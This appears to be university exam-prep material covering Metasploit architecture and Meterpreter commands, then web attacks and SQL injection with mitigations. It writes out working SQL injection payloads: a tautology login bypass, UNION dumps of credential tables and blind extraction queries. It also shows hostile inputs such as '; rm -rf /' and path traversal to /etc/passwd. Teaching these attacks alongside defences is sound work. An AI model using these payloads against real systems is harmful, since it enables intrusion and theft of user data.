> 4. **Post-exploitation modules** — actions after gaining initial access (e.g., hashdump).
>
> *(Encoders, NOP generators, and Evasion modules are also valid answers.)*

---

**Q2. [KTU University Exam — Dec 2023]**
*Differentiate between Stagers and Stages in Metasploit payloads with an example of each.*

**Model Answer (3 marks):**

| Aspect | Stager | Stage |
|--------|--------|-------|
| Size | Small, ~200 bytes | Large, multi-KB |
| Function | Establishes channel | Delivers full functionality |
| Delivery | Inside the exploit | Downloaded via stager |
| Example | `windows/shell/reverse_tcp` (stager) | `windows/meterpreter` (stage) |

The stager bootstraps a connection; the stage is the actual Meterpreter DLL injected reflectively.

---

### 📕 Part B — Long Answer Questions (14 Marks Each, Internal Choice)

---

#### **Question A (14 Marks) — [KTU University Exam — May 2024 Model Paper]**

**(a)** Explain the **architecture of the Metasploit framework** with a neat block diagram. Describe the role of **msfconsole, msfdb, and module loader**. **(7 marks)**

**(b)** Describe the **three-tier payload hierarchy (Singles, Stagers, Stages)** with suitable examples. Why is the stager-stage split necessary? **(7 marks)**

---

##### Model Solution for Q.A (a) — Architecture (7 marks)

The Metasploit framework is structured into **three primary tiers**:

**1. User Interface Layer:** Provides the analyst's entry point.
- `msfconsole` is the most widely used **interactive REPL** console, supporting tab-completion, command history, and inline Ruby scripting.
- `msfcli` was a non-interactive command runner (now deprecated/merged).
- `Armitage` is a **Java-based GUI** for collaborative red-team operations and visual attack graphs.
- The **Web UI** is exclusive to Metasploit Pro.

**2. Core Engine Layer:** Acts as the orchestration brain.
- **Module Loader** dynamically enumerates and loads all `.rb` module files at startup from `$INSTALL_ROOT/modules/`.
- **Session Manager** maintains active sessions (shell, Meterpreter, VNC) and tracks their state, idle time, and channels.
- **Database Layer (`msfdb`)** is a **PostgreSQL** backend that stores hosts, services, vulnerabilities, credentials, loot, and notes — making large engagements queryable.
- **Job Scheduler** allows multiple background modules to run concurrently.

**3. Module Layer:** Contains the actual offensive code, organized into **exploits, payloads, auxiliary, post, encoders, NOPs, and evasion** modules. Each module is a Ruby class extending `Msf::Module` base classes.

The communication between tiers uses **MessagePack-RPC** (a compact binary format) or **HTTP/REST** in v6.x.

*(Block diagram as in SECTION 4.1 above — 2 marks for the diagram.)*

---

##### Model Solution for Q.A (b) — Payload Hierarchy (7 marks)

**Singles (Inline Payloads):**
A single, self-contained payload that performs the entire attack in one go. No further download is required.

- **Example:** `windows/shell_reverse_tcp` opens a TCP connection back and spawns a `cmd.exe` shell.
- **Pros:** Simplicity, reliability, no two-stage network failures.
- **Cons:** Size-limited; not stealthy; full payload exposed in network traffic.

**Stagers (Bootstrap Payloads):**
A small payload whose **only job** is to establish a connection back to the attacker and request the stage.

- **Example:** `windows/shell/reverse_tcp` (stager variant) is a tiny ~360-byte stub.
- **Pros:** Fits inside size-restricted exploits (e.g., a single packet).
- **Cons:** Useless without the stage.

**Stages (Full-Feature Payloads):**
The complete payload that gets injected by the stager. Lives entirely in target RAM via reflective DLL injection.

- **Example:** `windows/meterpreter` is the canonical stage — it provides command execution, file upload/download, pivoting, and stealth.
- **Pros:** Powerful, in-memory, encrypted, modular.
- **Cons:** Requires the stager connection to be alive.

**Why the split is necessary:**
Many buffer-overflow exploits allow only a **small number of bytes** (e.g., 300–500 bytes) to be injected into a vulnerable process. The full Meterpreter is several megabytes. Hence the **stager** (tiny) bootstraps the channel, and the **stage** (large) is streamed in afterwards. This decoupling is one of Metasploit's most elegant design choices.

---

#### **Question B (14 Marks) — [KTU University Exam — Dec 2023 Model Paper]**

**(a)** With a **neat flow diagram**, explain the **phases of a penetration test using Metasploit**. Mention the database commands used in each phase. **(7 marks)**

**(b)** What is **Meterpreter**? Explain its **key features** and **any five post-exploitation commands** with their functions. **(7 marks)**

---

##### Model Solution for Q.B (a) — Penetration Test Phases (7 marks)

The six phases (PTES-aligned) of a Metasploit-driven pen test are:

**Phase 1 — Reconnaissance:** Passive and active information gathering.
- Metasploit commands: `whois`, `search_email_collector`, `auxiliary/gather/`.
- Database output: `hosts` table populated with discovered IPs.

**Phase 2 — Scanning:** Port scanning and service detection.
- `db_nmap -sS -sV -O <target>` — results auto-imported.
- Database commands: `hosts`, `services`, `db_nmap`.

**Phase 3 — Vulnerability Analysis:** Correlating services with known CVEs.
- `use auxiliary/scanner/vuln/*`
- Database: `db_vulns`, `vulns` table.

**Phase 4 — Exploitation:** Launching the chosen exploit + payload.
- `use exploit/...`, `set RHOSTS`, `set PAYLOAD`, `exploit` or `run`.
- Database: `sessions` table on success.

**Phase 5 — Post-Exploitation:** Privilege escalation, lateral movement, data harvesting.
- `post/windows/gather/hashdump`, `use auxiliary/scanner/smb/smb_login`.
- Database: `loot`, `creds` tables.

**Phase 6 — Reporting:** Generate client-facing reports.
- `db_report -f pdf -o report.pdf`
- Output: HTML, XML, PDF formats.

*(Flow diagram as in SECTION 4.2 above — 2 marks for the diagram.)*

---

##### Model Solution for Q.B (b) — Meterpreter (7 marks)

> **Meterpreter** (Meta-Interpreter) is an **advanced, dynamically extensible, in-memory payload** for Metasploit that operates via **reflective DLL injection**. It provides a powerful interactive shell on a compromised host **without writing anything to disk**, making it exceptionally stealthy.

**Key Features of Meterpreter:**
1. **In-Memory Operation** — runs entirely in RAM; no disk artifacts.
2. **TLS-Encrypted Channel** — all communication is encrypted end-to-end.
3. **Channel Multiplexing** — multiple logical command channels over one TCP connection.
4. **Reflective DLL Injection** — DLLs are loaded into a process's memory without needing them on disk.
5. **Process Migration** — can migrate between running processes to evade detection.
6. **Extensible Scripting** — supports Ruby and Python extensions loaded on the fly.

**Five Important Post-Exploitation Commands:**

| Command | Function |
|---------|----------|
| `sysinfo` | Displays target OS, architecture, language, and Meterpreter version. |
| `getuid` | Shows the current user context under which Meterpreter is running. |
| `hashdump` | Dumps the SAM database to extract NTLM password hashes. |
| `upload` / `download` | Transfers files between attacker and target. |
| `migrate <PID>` | Migrates Meterpreter into another process for stealth/persistence. |
| `getsystem` | Attempts privilege escalation to NT AUTHORITY\SYSTEM. |
| `keyscan_start` / `keyscan_dump` | Captures keystrokes on the target. |
| `webcam_list` / `webcam_snap` | Accesses the target's webcam. |
| `shell` | Drops into a standard `cmd.exe` shell from Meterpreter. |
| `background` | Sends the session back to msfconsole for multitasking. |

---

> [!WARNING] **KTU Examiner's Valuation Pitfalls — Lose No Marks!**
> 1. **Do NOT** confuse **Stagers with Stages** — examiners specifically test this. Remember: stager = tiny bootstrap; stage = full payload.
> 2. **Do NOT** write `msfconsole` and `msfcli` as the same thing — `msfcli` is largely deprecated.
> 3. **Always mention the database** (`msfdb` / PostgreSQL) when explaining the architecture — it carries 1–2 marks by itself.
> 4. **Always draw a block/flow diagram** in long-answer questions — it is **mandatory** and worth at least 2 marks.
> 5. **Cite the CVSS scale** (0–10) when discussing vulnerability severity — it shows depth.
> 6. **Do NOT** recommend using Metasploit for unauthorized testing in your answer — ethics is a frequent sub-question.
> 7. **Always specify payload type** (single/stager/stage) when giving examples — never just say "Meterpreter".

---

### 🧠 Topic Recap & Important Things to Remember

- ✅ **Metasploit** = open-source PT framework by **H.D. Moore (2003) / Rapid7**.
- ✅ Written in **Ruby** (with Python reimplementation ongoing in v6.x).
- ✅ Default DB backend is **PostgreSQL** (initialized via `msfdb init`).
- ✅ Seven module types: **Exploit, Payload, Auxiliary, Post, Encoder, NOP, Evasion**.
- ✅ Three-tier architecture: **UI Layer → Core Engine → Module Toolbox**.
- ✅ Payload hierarchy: **Singles** (self-contained) → **Stagers** (bootstrap) → **Stages** (full feature).
- ✅ **Meterpreter** is the flagship in-memory, TLS-encrypted, reflective-DLL payload.
- ✅ **PTES phases**: Recon → Scan → Vuln Analysis → Exploit → Post-Exploit → Report.
- ✅ Key formulas: $Risk = T \cdot V \cdot I$ ; $CVSS = 0.6 \cdot Impact + 0.4 \cdot Exploitability$ ; $P_{success} = V_{known} / V_{total}$.
- ✅ Standard ports abused: **445 (SMB)**, **21 (FTP)**, **3389 (RDP)**, **80/443 (HTTP/S)**.
- ✅ Always conduct pen tests **with explicit written authorization** — unauthorized use is a cybercrime under **IT Act 2000 §66** and **§43** of India.
- ✅ Metasploit is **dual-licensed** (BSD + MSF-LA); Metasploit **Pro** is the paid Rapid7 product.
- ✅ `db_nmap` is preferred over external `nmap` for database-integrated scans.
- ✅ The **EternalBlue** (MS17-010) exploit is a classic teaching example for SMB exploitation.
- ✅ Commands to memorize: `use`, `set`, `setg`, `show options`, `exploit`/`run`, `sessions -l`, `background`, `migrate`.
<!-- SECTION_5_END -->

topics.title: Web Security: Web Attacks, SQL Injection Attacks
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PBCST604 - FUNDAMENTALS OF CYBER SECURITY
> - **Module:** Module 2
> - **Topic:** Web Security: Web Attacks, SQL Injection Attacks

<!-- SECTION_1_START -->
# SECTION 1 — Core Technical Definition & Intuitive Overview

## 1.1 Web Security — Formal Definition

> [!IMPORTANT]
> **Web Security** is the discipline of protecting websites, web applications, and web services (including their associated APIs, databases, and back-end infrastructure) from malicious exploitation by threat actors. It encompasses the policies, protocols, tools, and engineering practices used to defend against threats that target the HTTP/HTTPS application layer (Layer 7 of the OSI model) and its associated data-processing pipeline.

In the **KTU 2024 syllabus (PBCST604)**, Web Security is treated as a sub-domain of application-layer (Layer 7) cybersecurity, with explicit emphasis on:

- **Attack surfaces** exposed by browsers, forms, URLs, cookies, and server-side scripts.
- **Vulnerabilities** introduced by insecure coding, weak input validation, and flawed authentication logic.
- **Countermeasures** such as input sanitization, parameterized queries, WAFs (Web Application Firewalls), and HTTPS/TLS.

## 1.2 Intuitive Analogy — The "Bank Vault" View of a Web Application

> [!NOTE]
> **Analogy:** Imagine a website as a **bank building**. The browser is the **customer lobby**, the login page is the **front door**, the database is the **vault in the basement**, and the SQL query is the **bank clerk** who fetches items from the vault on behalf of customers.
> A **web attack** is a thief who tricks, bypasses, or manipulates the bank clerk into handing over money or vault keys. **SQL Injection** specifically is when the thief whispers fake instructions *into* the customer's request form — and the clerk, trusting the form, executes the thief's orders instead of the customer's.

So the web server "trusts" user input too much — that misplaced trust is the root cause of nearly every web attack.

## 1.3 Web Attacks — Formal Definition

> [!IMPORTANT]
> **Web Attack:** Any malicious activity that targets a web-based system through HTTP/HTTPS requests, with the intent to compromise confidentiality, integrity, availability, authentication, or authorization of the application, its data, or its users.

Web attacks exploit vulnerabilities catalogued in the **OWASP Top 10** (Open Web Application Security Project), which is the de-facto industry benchmark referenced in the KTU syllabus.

## 1.4 SQL Injection (SQLi) — Formal Definition

> [!IMPORTANT]
> **SQL Injection (SQLi):** A code-injection attack in which an attacker inserts (injects) malicious SQL statements into an input field (e.g., login form, search box, URL parameter) that is later concatenated into a legitimate SQL query and executed by the back-end database engine — without proper sanitization or parameterization.

SQLi is consistently ranked **#1 or #3** in the OWASP Top 10 across editions and is the **most destructive classical web attack** because it directly compromises the **back-end data store** — the crown jewel of most applications.

## 1.5 Why These Attacks Matter in the KTU Context

> [!NOTE]
> The KTU 2024 scheme expects students to:
> - **Identify** attack vectors at the application layer.
> - **Demonstrate** how an SQL Injection is constructed (logical proof).
> - **Recommend** mitigation strategies (defense-in-depth).
> - **Evaluate** the security posture of a typical LAMP/MEAN stack application.

These outcomes map to **CO2 (Analyze security threats)** and **CO3 (Apply cryptographic and application-layer defenses)** of PBCST604.

---

## 1.6 Common Metric: **CVSS Score** (Common Vulnerability Scoring System)

> [!NOTE]
> The **CVSS Score** is a standard **0.0 – 10.0** numerical metric (defined by **FIRST.org**) that rates the severity of a vulnerability. **SQL Injection vulnerabilities typically score between 7.5 (High) and 9.8 (Critical)** depending on context. This score is a mandatory reporting metric in modern security advisories.
<!-- SECTION_1_END -->

<!-- SECTION_2_START -->
# SECTION 2 — Deep Theoretical Analysis & KTU High-Yield Cheat Sheet

## 2.1 The Web Application Stack — Attack Surface Anatomy

A typical web application (e.g., a LAMP stack) consists of:

1. **Client-side (Browser):** HTML, CSS, JavaScript, cookies, local storage.
2. **Network Layer:** HTTP/HTTPS over TCP/IP.
3. **Web Server:** Apache / Nginx / IIS.
4. **Application Layer:** PHP / Python / Node.js / Java / ASP.NET.
5. **Database Layer:** MySQL / PostgreSQL / MongoDB / Oracle / SQL Server.

> [!IMPORTANT]
> **SQL Injection lives in the gap between Layers 4 and 5** — specifically, wherever user input is concatenated into a query string that is sent to the database.

## 2.2 OWASP Top 10 (2021 Edition) — Web Attack Categorization

| # | Vulnerability | KTU Exam Relevance |
|---|---------------|--------------------|
| A01 | Broken Access Control | High |
| A02 | Cryptographic Failures | Medium |
| A03 | **Injection (incl. SQLi)** | **Critical — most-tested** |
| A04 | Insecure Design | Medium |
| A05 | Security Misconfiguration | Medium |
| A06 | Vulnerable & Outdated Components | Low |
| A07 | Identification & Authentication Failures | High |
| A08 | Software & Data Integrity Failures | Medium |
| A09 | Security Logging & Monitoring Failures | Low |
| A10 | Server-Side Request Forgery (SSRF) | Medium |

## 2.3 Major Web Attack Categories (KTU Focus)

### 2.3.1 Injection Attacks
- **SQL Injection (SQLi)** — the primary topic.
- **NoSQL Injection** — for MongoDB etc.
- **LDAP Injection** — for directory services.
- **OS Command Injection** — e.g., `; rm -rf /`.
- **Cross-Site Scripting (XSS)** — JavaScript injection in browser context.

### 2.3.2 Authentication & Session Attacks
- Brute Force / Credential Stuffing
- Session Hijacking (stealing session cookies)
- Session Fixation (forcing a known session ID)

### 2.3.3 Client-Side Attacks
- **Cross-Site Scripting (XSS)** — Stored, Reflected, DOM-based.
- **Cross-Site Request Forgery (CSRF)** — tricking logged-in users.
- **Clickjacking** — invisible iframe overlays.

### 2.3.4 Server-Side / Logic Attacks
- **Insecure Direct Object References (IDOR)** — `/account?id=1001` → `/account?id=1002`.
- **File Upload Attacks** — uploading `.php` shell as `.jpg`.
- **Directory Traversal** — `../../../../etc/passwd`.
- **Server-Side Request Forgery (SSRF)**.

### 2.3.5 Denial-of-Service (Web Layer)
- HTTP Flood
- Slowloris (slow-header DoS)
- Application-layer DDoS

## 2.4 SQL Injection — Deep Mechanism

### 2.4.1 The Vulnerable Code Pattern

The root cause is **string concatenation** of user input into a SQL statement. Consider a typical PHP login check:

```php
// VULNERABLE CODE
$username = $_POST['user'];
$password = $_POST['pass'];
$query = "SELECT * FROM users WHERE user='" . $username 
         . "' AND pass='" . $password . "'";
$result = mysql_query($query);
```

The database engine receives the **entire concatenated string** as a SQL command. It does not know which parts came from the user and which from the developer — it simply **parses and executes**.

### 2.4.2 Types of SQL Injection (KTU High-Yield Classification)

| Type | Also Called | Mechanism | Blind? |
|------|-------------|-----------|--------|
| **Classic / In-band SQLi** | Error-based / Union-based | Attacker sees results directly in the response | No |
| **Blind Boolean-based** | Inferential | App reveals true/false via different responses | Yes |
| **Blind Time-based** | Inferential | App reveals via response delay (e.g., `SLEEP()`) | Yes |
| **Out-of-Band** | OOB | Data exfiltrated via DNS/HTTP to attacker server | No |
| **Second-Order SQLi** | Stored SQLi | Malicious input stored, executed later in a different query | No |

### 2.4.3 The "Always True" Tautology Attack

The simplest classic SQLi — a **bypass authentication** example:

```
Username: ' OR '1'='1
Password: ' OR '1'='1
```

Resulting query sent to MySQL:

```sql
SELECT * FROM users WHERE user='' OR '1'='1' AND pass='' OR '1'='1'
```

Because `'1'='1'` is **always true**, the `WHERE` clause evaluates to true for every row, and the application logs the attacker in — often as the **first user** in the table (commonly `admin`).

### 2.4.4 The UNION-based Attack (Data Exfiltration)

The `UNION` operator appends a second `SELECT` to the original. The injected payload:

```
' UNION SELECT username, password FROM users --
```

Generated query:

```sql
SELECT name, price FROM products WHERE id='' 
UNION SELECT username, password FROM users --'
```

The `--` comments out the trailing `'`, neutralizing the rest of the original query. The attacker now sees the entire `users` table dumped into the product page.

### 2.4.5 Boolean Blind SQLi — The Yes/No Oracle

When the app hides errors, the attacker infers data **one bit at a time**:

```
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE user='admin')='a' --
```

- If the page loads **normally** → first character is `a`.
- If the page returns **empty / different** → first character is not `a`.
- Repeat for each character → full password extraction.

### 2.4.6 Time-based Blind SQLi — The Delay Oracle

```
' OR IF(1=1, SLEEP(5), 0) --
```

- If response is delayed **5 seconds** → condition is true.
- If response is **immediate** → condition is false.

This works even when the application returns identical output for both cases.

## 2.5 KTU High-Yield Cheat Sheet — Web Attacks & SQLi

| Concept | Key Fact | KTU Exam Tip |
|---------|----------|--------------|
| **SQLi Root Cause** | Untrusted input concatenated into SQL string | Memorize — examiners ask this verbatim |
| **Tautology Example** | `' OR '1'='1` | Most-tested example |
| **UNION Rule** | Same number & compatible types of columns | Required for UNION attack to work |
| **Comment Trick** | `--` (MySQL/SQL Server) or `/* */` or `#` (MySQL) | Used to nullify trailing query |
| **Mitigation #1** | **Parameterized Queries / Prepared Statements** | GOLD STANDARD answer |
| **Mitigation #2** | Stored Procedures | Good but not foolproof |
| **Mitigation #3** | Input Validation (Whitelisting) | Defense-in-depth layer |
| **Mitigation #4** | Escaping (e.g., `mysqli_real_escape_string`) | Weakest of the four |
| **Mitigation #5** | Least Privilege DB User | Limits blast radius |
| **Mitigation #6** | WAF (Web Application Firewall) | Network-layer shield |
| **XSS vs SQLi** | XSS targets the **client/browser**; SQLi targets the **database** | Common confusion — clarify in answers |
| **CSRF Token** | Per-request unpredictable token to prevent CSRF | Mentioned under session attacks |
| **CVSS for SQLi** | Typically **7.5 – 9.8** | Cite as severity metric |
| **OWASP Top 10 Rank** | Injection = **A03** in 2021 edition | May appear as 2-mark Q |
| **CWE-89** | Official MITRE ID for SQL Injection | Optional advanced answer |

## 2.6 Real-World Engineering Utility

> [!NOTE]
> - **Banking & FinTech** — SQLi is the #1 vector for mass PII (Personally Identifiable Information) breaches.
> - **Healthcare (HIPAA)** — Patient record theft via SQLi triggers regulatory fines.
> - **E-Commerce** — Card-skimming via stored XSS in product reviews.
> - **Government & Defence** — SQLi used in historical breaches (e.g., Heartland Payment Systems, 2008).
> - **DevSecOps** — Static Application Security Testing (SAST) tools like **SonarQube, Checkmarx, Snyk** now auto-flag SQLi patterns in CI/CD pipelines.

The principles you learn here apply directly to **secure software engineering roles** and **penetration testing certifications** like CEH, OSCP, and CompTIA PenTest+.
<!-- SECTION_2_END -->

<!-- SECTION_3_START -->
# SECTION 3 — Step-by-Step Derivations & Analytical Matrix

## 3.1 SQL Injection — Exhaustive Step-by-Step Logical Derivation

We will derive, step by step, exactly how a SQLi attack works, starting from a vulnerable code line and ending with a successful exploit.

### 3.1.1 Step 1: The Developer's Original Intention

The developer wants to authenticate a user against a `users` table.

```php
$query = "SELECT * FROM users WHERE user='$u' AND pass='$p'";
```

For a legitimate user `alice` with password `Wonderland1!`, the expected query is:

$$
Q_{legit} = \texttt{SELECT * FROM users WHERE user='alice' AND pass='Wonderland1!'}
$$

### 3.1.2 Step 2: The Attacker's Malicious Input

The attacker submits, in the username field:

$$
u_{attack} = \texttt{' OR '1'='1}
$$

In the password field:

$$
p_{attack} = \texttt{' OR '1'='1}
$$

### 3.1.3 Step 3: The Concatenation (The Vulnerable Glue)

The web application, executing the vulnerable line, **does not sanitize** the input. It performs simple string concatenation:

$$
Q_{injected} = \texttt{SELECT * FROM users WHERE user='' OR '1'='1' AND pass='' OR '1'='1'}
$$

### 3.1.4 Step 4: SQL Operator Precedence — The Logical Explosion

In SQL, the `AND` operator has **higher precedence** than `OR` (matching Boolean algebra). So the engine evaluates:

$$
Q_{injected} \equiv \underbrace{(\texttt{user=''})}_{\text{false}} \;\texttt{OR}\; \underbrace{(\texttt{'1'='1' AND pass=''})}_{\text{true AND false = false}} \;\texttt{OR}\; \underbrace{(\texttt{'1'='1'})}_{\text{true}}
$$

Formally:

$$
Q_{eval} = \text{user} = \epsilon \;\lor\; (1 = 1 \land \text{pass} = \epsilon) \;\lor\; (1 = 1)
$$

Where $\epsilon$ denotes the empty string. Since the last disjunct is **always true**:

$$
Q_{eval} = \text{TRUE}
$$

The `WHERE` clause returns **every row** in the `users` table. The application then picks (typically) the **first row** — most often the `admin` row — and grants full access.

### 3.1.5 Step 5: Result — Authentication Bypass Achieved

The attacker is now logged in as `admin` (or the first user), without knowing any credentials.

## 3.2 UNION-based Data Exfiltration — Full Logical Walkthrough

### 3.2.1 Step 1: Determine the Column Count

The attacker injects:

```
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
...
```

The error or success indicates the number of columns. Let $n$ = number of columns in the original `SELECT`.

### 3.2.2 Step 2: Identify Displayed Columns

Using:

```
' UNION SELECT 1,2,3 --
```

The numbers that **appear visibly in the page** are the columns rendered to the user. Suppose columns 2 and 3 are displayed.

### 3.2.3 Step 3: Exfiltrate Schema Metadata

The attacker probes the database catalog:

```sql
' UNION SELECT 1, table_name, table_schema FROM information_schema.tables --
```

This lists every table and its schema. The attacker locates the target table, e.g., `users`.

### 3.2.4 Step 4: Exfiltrate Column Names

```sql
' UNION SELECT 1, column_name, data_type FROM information_schema.columns 
WHERE table_name='users' --
```

Output might be: `id`, `username`, `password`, `email`.

### 3.2.5 Step 5: Dump the Data

```sql
' UNION SELECT 1, username, password FROM users --
```

The full credential table now appears in the application's response.

### 3.2.6 Step 6: Formal Summary

$$
Q_{final} = Q_{orig} \;\cup\; \pi_{\text{username, password}}(\text{users})
$$

Where $\pi$ denotes the relational **projection** operator. The attack is a textbook **relational algebra** operation piggybacked onto a legitimate query.

## 3.3 Boolean Blind SQLi — Bit-by-Bit Password Extraction

Let the admin's password be $P = p_1 p_2 p_3 \dots p_k$ (a string of length $k$). The attacker extracts $P$ one character at a time using the binary search optimization.

### 3.3.1 Algorithm

For position $i \in \{1, 2, \dots, k\}$:

1. Compute the ASCII value of $p_i$ via a series of `SUBSTRING` and `ASCII` calls.
2. Use binary search (or character-by-character brute force) on the ASCII range **0–127**.
3. The truth value of the injected condition is reflected in the application's response.

### 3.3.2 Example Injection

$$
\texttt{' AND ASCII(SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1)) > 64 --}
$$

- If **true** → page A loads.
- If **false** → page B loads.

The attacker halves the ASCII range with each query, achieving $O(\log_2 128) = 7$ queries per character. For a 12-character password, total queries $\approx 12 \times 7 = 84$.

## 3.4 Time-based Blind SQLi — The Delay Oracle

For a condition $C$:

$$
\texttt{' OR IF(C, SLEEP(5), 0) --}
$$

- If $C$ is **true** → DB sleeps 5 s → response delayed.
- If $C$ is **false** → DB returns instantly.

This converts a **closed-world system** (no output) into an **open-world oracle** (a timing side channel).

## 3.5 Analytical Matrix — Attack vs. Defense Mapping

| Attack Vector | Detection Method | Primary Mitigation | Secondary Mitigation |
|---------------|------------------|--------------------|----------------------|
| Classic SQLi | Error messages in response | **Prepared Statements** | Escaping + WAF |
| Blind Boolean | Response length/content diff | **Prepared Statements** | Custom error pages |
| Blind Time-based | Response latency analysis | **Prepared Statements** | Query timeouts |
| Union-based | UNION keyword in logs | **Prepared Statements** | Disable DB error display |
| Second-Order | Code review / SAST | **ORM frameworks** | Input whitelisting |
| Stored XSS | Payload in DB output | Output encoding (HTML escape) | CSP headers |
| Reflected XSS | URL inspection | Output encoding | Input validation |
| CSRF | Replayed requests | **Anti-CSRF tokens** | SameSite cookies |
| Session Hijacking | Anomalous IP/User-Agent | HTTPS + Secure cookies | Session rotation |
| IDOR | Manual enumeration | Indirect reference maps | Authorization checks |
| File Upload | Malicious MIME in logs | Extension whitelisting | Store outside webroot |

## 3.6 Defense-in-Depth Equation (Conceptual)

Effective web security is **not a single control** but a layered system. The probability of successful exploitation is:

$$
P_{exploit} = P_{bypass\;WAF} \times P_{bypass\;Input\;Filter} \times P_{bypass\;Prepared\;Stmt} \times P_{bypass\;DB\;Privilege}
$$

Each independent mitigation **multiplicatively** reduces risk. This is why KTU examiners credit answers that mention **multiple** defenses rather than a single fix.
<!-- SECTION_3_END -->

<!-- SECTION_4_START -->
# SECTION 4 — Structural Diagrams & Schematics

## 4.1 Mermaid Diagram 1 — Web Application Request Flow & Attack Injection Point

```mermaid
flowchart TD
    A[User Browser] -->|HTTP GET POST| B[Web Server Apache Nginx]
    B --> C{Input Validation}
    C -->|Pass| D[Application Layer PHP Python Java]
    C -->|Bypass via Injection| E[Vulnerable Code Path]
    D --> F[Database Engine MySQL PostgreSQL]
    E --> F
    F -->|Legitimate Result| D
    F -->|Injected Result dumps tables| G[Attacker Browser]
    D --> H[HTTP Response]
    H --> A
    G -.->|Exfiltrated Data| I[Attacker Server]
```

> [!NOTE]
> **Reading the diagram:** The injection point is between **Node C (Input Validation)** and **Node F (Database Engine)**. If Node C is missing or weak, control flows through the red bypass path `C → E → F`, leading to compromise.

## 4.2 Mermaid Diagram 2 — SQL Injection Attack Lifecycle

```mermaid
flowchart LR
    P1[1 Reconnaissance Probe column count] --> P2[2 Identify DB Engine mysql mssql oracle]
    P2 --> P3[3 Test for SQLi via tautology]
    P3 --> P4[4 Choose Attack Type Union Boolean Time]
    P4 --> P5[5 Extract Schema information schema]
    P5 --> P6[6 Dump Target Tables users credentials]
    P6 --> P7[7 Maintain Access backdoor or exfiltrate]
```

## 4.3 Mermaid Diagram 3 — Defense-in-Depth Layered Architecture

```mermaid
flowchart TD
    L0[Internet] --> L1[Layer 1 WAF Web Application Firewall]
    L1 --> L2[Layer 2 TLS HTTPS Encryption]
    L2 --> L3[Layer 3 Input Validation Whitelist]
    L3 --> L4[Layer 4 Prepared Statements Parameterized Queries]
    L4 --> L5[Layer 5 ORM Framework Abstraction]
    L5 --> L6[Layer 6 Database Least Privilege User]
    L6 --> L7[Layer 7 Encrypted Backups and Auditing]
    L7 --> DB[(Database)]
```

> [!IMPORTANT]
> An attacker must **defeat every layer** simultaneously for a successful breach. The multiplicative probability model (see Section 3.6) is the engineering rationale for layered defense.

## 4.4 Mermaid Diagram 4 — Authentication Bypass via Tautology (Sequence)

```mermaid
sequenceDiagram
    participant U as Attacker
    participant W as Web App Login Form
    participant S as Server Side Script
    participant D as Database

    U->>W: Submit user ' OR 1 1
    U->>W: Submit pass ' OR 1 1
    W->>S: POST user pass
    S->>S: Concatenate into SQL string
    S->>D: SELECT WHERE user empty OR 1 1 AND pass empty OR 1 1
    D-->>S: Returns all rows admin first
    S-->>W: Auth success admin role
    W-->>U: Redirect to dashboard full access
```

## 4.5 Mermaid Diagram 5 — XSS vs SQLi Attack Target Comparison

```mermaid
flowchart LR
    subgraph XSS_Attack [XSS Attack Path]
        X1[Attacker] --> X2[Inject JS into page]
        X2 --> X3[Victim Browser executes JS]
        X3 --> X4[Cookie theft session hijack]
    end

    subgraph SQLi_Attack [SQLi Attack Path]
        S1[Attacker] --> S2[Inject SQL into form]
        S2 --> S3[Database executes injected SQL]
        S3 --> S4[Data exfiltration table dump]
    end
```

> [!NOTE]
> **Key Takeaway:** XSS compromises the **client** (browser); SQLi compromises the **server-side database**. They are not interchangeable. KTU examiners frequently test this distinction.

## 4.6 Block-Level Functional Architecture — Web Attack Surface Map

```
+---------------------------------------------------------------+
|                       EXTERNAL THREATS                        |
|   (Script Kiddies, Hacktivists, APTs, Insider Threats)        |
+---------------------------------------------------------------+
                          |
                          v
+---------------------------------------------------------------+
|                    PERIMETER LAYER                            |
|  Firewall  |  DDoS Protection  |  WAF  |  TLS Termination     |
+---------------------------------------------------------------+
                          |
                          v
+---------------------------------------------------------------+
|                  APPLICATION LAYER (Layer 7)                  |
|                                                               |
|  [Login Form]  [Search Box]  [URL Params]  [Cookies]          |
|        |             |             |             |            |
|        +------+------+------+------+             |            |
|               |             |                    |            |
|        [Input Validation]   |              [Session Mgmt]     |
|               |             |                    |            |
|        [Prepared Stmts]     |              [CSRF Tokens]      |
|               |             |                    |            |
|        [ORM / Query Builder]|              [Secure Cookies]   |
+---------------------------------------------------------------+

                          v
```
